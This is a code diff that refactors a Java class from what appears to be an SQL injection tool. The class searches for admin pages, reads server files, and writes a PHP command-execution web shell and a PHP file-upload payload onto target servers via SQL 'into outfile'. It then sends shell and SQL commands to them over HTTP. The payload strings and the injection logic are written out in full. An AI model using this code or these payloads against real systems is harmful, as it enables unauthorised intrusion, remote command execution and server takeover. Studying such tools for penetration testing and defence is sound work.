@@ -35,6 +35,8 @@ import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import org.apache.log4j.Logger;
+
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
 import com.jsql.model.InjectionModel;
@@ -73,6 +75,21 @@ public class RessourceAccessObject {
     public boolean endAdminSearch = false;
     
     /**
+     * True if current user has right to read file. 
+     */
+    public boolean hasFileRight = false;
+    
+    /**
+     * True if file search must stop, false otherwise.
+     */
+    public boolean endFileSearch = false;
+
+    /**
+     * Log4j logger sent to view.
+     */
+    private static final Logger LOGGER = Logger.getLogger(RessourceAccessObject.class);
+
+    /**
      * Check if every page in the list responds 200 OK.
      * @param string
      * @param list List of admin pages ot test
@@ -81,7 +98,7 @@ public class RessourceAccessObject {
         String fin = string.replaceAll("^https?://[^/]*", "");
         String debut = string.replace(fin, "");
         String chemin = fin.replaceAll("[^/]*$", "");
-        ArrayList<String> cheminArray = new ArrayList<String>();
+        List<String> cheminArray = new ArrayList<String>();
         if (chemin.split("/").length == 0) {
             cheminArray.add("/");
         }
@@ -106,21 +123,20 @@ public class RessourceAccessObject {
         for (int tasksHandled = 0; tasksHandled < submittedTasks
                 && !this.endAdminSearch; tasksHandled++) {
             try {
-                AdminPageCallable currentCallable
-                        = taskCompletionService.take().get();
-                if (currentCallable.responseCodeHTTP != null
-                        && currentCallable.responseCodeHTTP.indexOf("200 OK") >= 0) {
+                AdminPageCallable currentCallable = taskCompletionService.take().get();
+                if (currentCallable.getResponseCodeHTTP() != null
+                        && currentCallable.getResponseCodeHTTP().indexOf("200 OK") >= 0) {
                     Request request = new Request();
                     request.setMessage("CreateAdminPageTab");
-                    request.setParameters(currentCallable.url);
+                    request.setParameters(currentCallable.getUrl());
                     GUIMediator.model().interact(request);
 
                     nb++;
                 }
             } catch (InterruptedException e) {
-                InjectionModel.LOGGER.error(e, e);
+                LOGGER.error(e, e);
             } catch (ExecutionException e) {
-                InjectionModel.LOGGER.error(e, e);
+                LOGGER.error(e, e);
             }
         }
 
@@ -128,13 +144,12 @@ public class RessourceAccessObject {
         try {
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         }
 
         this.endAdminSearch = false;
 
-        InjectionModel.LOGGER.info(
-                "Admin page(s) found: " + nb + "/" + submittedTasks);
+        LOGGER.info("Admin page(s) found: " + nb + "/" + submittedTasks);
 
         Request request = new Request();
         request.setMessage("EndAdminSearch");
@@ -148,7 +163,7 @@ public class RessourceAccessObject {
      * @throws PreparationException
      * @throws StoppableException
      */
-    public void getShell(String path, String url)
+    public void getShell(String path, String newUrl)
             throws PreparationException, StoppableException {
         if (!this.checkFilePrivilege()) {
             return;
@@ -175,11 +190,12 @@ public class RessourceAccessObject {
             return;
         }
 
+        String url = newUrl;
         if ("".equals(url)) {
             url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
         }
 
-        ArrayList<String> f = new ArrayList<String>();
+        List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
         if (StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
             Request request = new Request();
@@ -187,7 +203,7 @@ public class RessourceAccessObject {
             request.setParameters(path, url);
             GUIMediator.model().interact(request);
         } else {
-            InjectionModel.LOGGER.warn("Web shell not usable.");
+            LOGGER.warn("Web shell not usable.");
         }
     }
     
@@ -199,17 +215,20 @@ public class RessourceAccessObject {
      * @throws PreparationException
      * @throws StoppableException
      */
-    public void upload(String path, String url, File file) throws PreparationException, StoppableException {
+    public void upload(String path, String newUrl, File file) throws PreparationException, StoppableException {
         if (!this.checkFilePrivilege()) {
             return;
         }
+        
+        String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
         GUIMediator.model().inject(
-                GUIMediator.model().initialQuery.replaceAll("1337" + GUIMediator.model().visibleIndex + "7331", "(select+0x" + StringTool.strhex("<SQLi>" +
-                        "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>" +
-                        "<iLQS>") + ")").replaceAll("--++", "") +
-                "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
-                );
+                GUIMediator.model().initialQuery.replaceAll(
+                        "1337" + GUIMediator.model().visibleIndex + "7331",
+                        "(select+0x" + StringTool.strhex("<SQLi>" + phpShell + "<iLQS>") + ")"
+                ).replaceAll("--++", "")
+                + "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
+        );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
@@ -224,13 +243,14 @@ public class RessourceAccessObject {
             return;
         }
 
+        String url = newUrl;
         if ("".equals(url)) {
             url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
         }
 
-        ArrayList<String> f = new ArrayList<String>();
+        List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-        if (StringTool.hexstr(hexResult).indexOf("<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>") > -1) {
+        if (StringTool.hexstr(hexResult).indexOf(phpShell) > -1) {
             
             String crLf = "\r\n";
             URLConnection conn = null;
@@ -264,7 +284,7 @@ public class RessourceAccessObject {
                 int index = 0;
                 int size = 1024;
                 do {
-                    if ((index + size) > imgData.length) {
+                    if (index + size > imgData.length) {
                         size = imgData.length - index;
                     }
                     os.write(imgData, index, size);
@@ -291,9 +311,9 @@ public class RessourceAccessObject {
                 imgIs.close();
                 
                 if (result.indexOf("SQLiy") > -1) {
-                    InjectionModel.LOGGER.info("Upload successful.");
+                    LOGGER.info("Upload successful.");
                 } else {
-                    InjectionModel.LOGGER.warn("Upload failed.");
+                    LOGGER.warn("Upload failed.");
                 }
                 
                 Map<String, Object> msgHeader = new HashMap<String, Object>();
@@ -308,21 +328,21 @@ public class RessourceAccessObject {
                 request.setParameters(msgHeader);
                 GUIMediator.model().interact(request);
             } catch (Exception e) {
-                InjectionModel.LOGGER.error(e, e);
+                LOGGER.error(e, e);
             } finally {
                 try {
                     os.close();
                 } catch (Exception e) {
-                    InjectionModel.LOGGER.error(e, e);
+                    LOGGER.error(e, e);
                 }
                 try {
                     is.close();
                 } catch (Exception e) {
-                    InjectionModel.LOGGER.error(e, e);
+                    LOGGER.error(e, e);
                 }
             }
         } else {
-            InjectionModel.LOGGER.warn("Upload not usable.");
+            LOGGER.warn("Upload not usable.");
         }
         
         Request request = new Request();
@@ -354,7 +374,7 @@ public class RessourceAccessObject {
             GUIMediator.model().interact(request);
             hasFileRight = false;
         } else if (StringTool.hexstr(hexResult).equals("false")) {
-            InjectionModel.LOGGER.warn("No FILE privilege");
+            LOGGER.warn("No FILE privilege");
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
             GUIMediator.model().interact(request);
@@ -368,16 +388,6 @@ public class RessourceAccessObject {
         
         return hasFileRight;
     }
-    
-    /**
-     * True if current user has right to read file. 
-     */
-    public boolean hasFileRight = false;
-    
-    /**
-     * True if file search must stop, false otherwise.
-     */
-    public boolean endFileSearch = false;
     
     /**
      * Create a panel for each file in the list.
@@ -398,15 +408,15 @@ public class RessourceAccessObject {
             taskCompletionService.submit(new FileCallable(s.toString()));
         }
 
-        ArrayList<String> duplicate = new ArrayList<String>();
+        List<String> duplicate = new ArrayList<String>();
         int submittedTasks = list.size();
         for (int tasksHandled = 0; tasksHandled < submittedTasks && !endFileSearch; tasksHandled++) {
             try {
                 FileCallable currentCallable = taskCompletionService.take().get();
-                if (!"".equals(currentCallable.fileSource)) {
-                    String name = currentCallable.url.substring(currentCallable.url.lastIndexOf('/') + 1, currentCallable.url.length());
-                    String content = StringTool.hexstr(currentCallable.fileSource).replace("\r", "");
-                    String path = currentCallable.url;
+                if (!"".equals(currentCallable.getFileSource())) {
+                    String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
+                    String content = StringTool.hexstr(currentCallable.getFileSource()).replace("\r", "");
+                    String path = currentCallable.getUrl();
 
                     Request request = new Request();
                     request.setMessage("CreateFileTab");
@@ -414,7 +424,7 @@ public class RessourceAccessObject {
                     GUIMediator.model().interact(request);
 
                     if (!duplicate.contains(path.replace(name, ""))) {
-                        InjectionModel.LOGGER.info(
+                        LOGGER.info(
                                 "Shell might be possible in folder "
                                 + path.replace(name, ""));
                     }
@@ -423,9 +433,9 @@ public class RessourceAccessObject {
                     nb++;
                 }
             } catch (InterruptedException e) {
-                InjectionModel.LOGGER.error(e, e);
+                LOGGER.error(e, e);
             } catch (ExecutionException e) {
-                InjectionModel.LOGGER.error(e, e);
+                LOGGER.error(e, e);
             }
         }
 
@@ -433,12 +443,12 @@ public class RessourceAccessObject {
         try {
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         }
 
         endFileSearch = false;
 
-        InjectionModel.LOGGER.info("File(s) found: " + nb + "/" + submittedTasks);
+        LOGGER.info("File(s) found: " + nb + "/" + submittedTasks);
         Request request = new Request();
         request.setMessage("EndFileSearch");
         GUIMediator.model().interact(request);
@@ -454,7 +464,8 @@ public class RessourceAccessObject {
         URLConnection connection;
         String result = "";
         try {
-            connection = new URL(wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
+            String url = wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1");
+            connection = new URL(url).openConnection();
             connection.setReadTimeout(60000);
             connection.setConnectTimeout(60000);
 
@@ -471,7 +482,7 @@ public class RessourceAccessObject {
             result = regexSearch.group(1);
             
             Map<String, Object> msgHeader = new HashMap<String, Object>();
-            msgHeader.put("Url", wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1"));
+            msgHeader.put("Url", url);
             msgHeader.put("Cookie", "");
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
@@ -482,9 +493,9 @@ public class RessourceAccessObject {
             request.setParameters(msgHeader);
             GUIMediator.model().interact(request);
         } catch (MalformedURLException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         } catch (IOException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         } finally {
             // Unfroze interface
             Request request = new Request();
@@ -503,7 +514,7 @@ public class RessourceAccessObject {
      * @throws PreparationException
      * @throws StoppableException
      */
-    public void getSQLShell(String path, String url, String user, String pass) throws PreparationException, StoppableException {
+    public void getSQLShell(String path, String newUrl, String user, String pass) throws PreparationException, StoppableException {
         if (!this.checkFilePrivilege()) {
             return;
         }
@@ -534,12 +545,13 @@ public class RessourceAccessObject {
             GUIMediator.model().sendResponseFromSite("Can't find SQL shell at " + path + SQLSHELL_FILENAME, sourcePage[0].trim());
             return;
         }
-
+        
+        String url = newUrl;
         if ("".equals(url)) {
             url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
         }
 
-        ArrayList<String> f = new ArrayList<String>();
+        List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
         if (StringTool.hexstr(hexResult).indexOf(s) > -1) {
             Request request = new Request();
@@ -547,7 +559,7 @@ public class RessourceAccessObject {
             request.setParameters(path, url, user, pass);
             GUIMediator.model().interact(request);
         } else {
-            InjectionModel.LOGGER.warn("SQL shell not usable.");
+            LOGGER.warn("SQL shell not usable.");
         }
     }
 
@@ -563,9 +575,8 @@ public class RessourceAccessObject {
         URLConnection connection;
         String result = "";
         try {
-            connection = new URL(wbhPath + SQLSHELL_FILENAME + "?q="
-                    + URLEncoder.encode(cmd.trim(), "ISO-8859-1")
-                    + "&u=" + user + "&p=" + pass).openConnection();
+            String url = wbhPath + SQLSHELL_FILENAME + "?q=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1") + "&u=" + user + "&p=" + pass;
+            connection = new URL(url).openConnection();
             connection.setReadTimeout(60000);
             connection.setConnectTimeout(60000);
 
@@ -582,9 +593,7 @@ public class RessourceAccessObject {
             result = regexSearch.group(1);
             
             Map<String, Object> msgHeader = new HashMap<String, Object>();
-            msgHeader.put("Url", wbhPath + SQLSHELL_FILENAME + "?q="
-                    + URLEncoder.encode(cmd.trim(), "ISO-8859-1")
-                    + "&u=" + user + "&p=" + pass);
+            msgHeader.put("Url", url);
             msgHeader.put("Cookie", "");
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
@@ -595,9 +604,9 @@ public class RessourceAccessObject {
             request.setParameters(msgHeader);
             GUIMediator.model().interact(request);
         } catch (MalformedURLException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         } catch (IOException e) {
-            InjectionModel.LOGGER.error(e, e);
+            LOGGER.error(e, e);
         } finally {
             // Unfroze interface
             Request request = new Request();
